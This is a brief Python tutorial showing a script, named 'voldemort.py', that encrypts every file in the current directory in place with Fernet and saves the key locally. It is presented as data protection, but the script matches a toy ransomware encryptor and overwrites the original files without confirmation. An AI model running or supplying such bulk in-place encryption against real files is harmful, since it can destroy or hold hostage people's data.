## Encrypting Files with Python and Fernet
This tutorial will guide you through the process of encrypting files using Python and the Fernet encryption algorithm from the cryptography library.

### Prerequisites
Before we start, ensure you have Python installed on your system. Additionally, you'll need to install the cryptography library using pip:

```bash
pip install cryptography
```
### Understanding the Script
Let's break down the script step by step:

```python
#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
```
We begin by importing the necessary modules: os for interacting with the operating system and Fernet from cryptography.fernet for encryption.

```python
files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)
```
Here, we iterate through the files in the current directory, excluding specific files like `"voldemort.py"` and `"thekey.key"`. We append the names of regular files to the `files` list.

```python
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)
```
A new key is generated using the `Fernet.generate_key()` method. This key is then saved to a file named "thekey.key" in binary write mode.

```python
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
```
For each `file` in the files list, its contents are read and encrypted using the Fernet encryption algorithm and the generated key. The encrypted contents are then written back to the file.

### Conclusion
Congratulations! You've learned how to encrypt files using Python and the Fernet encryption algorithm. This technique can be useful for protecting sensitive data stored in files. Remember to keep your encryption key secure, as it's essential for decrypting the files later.
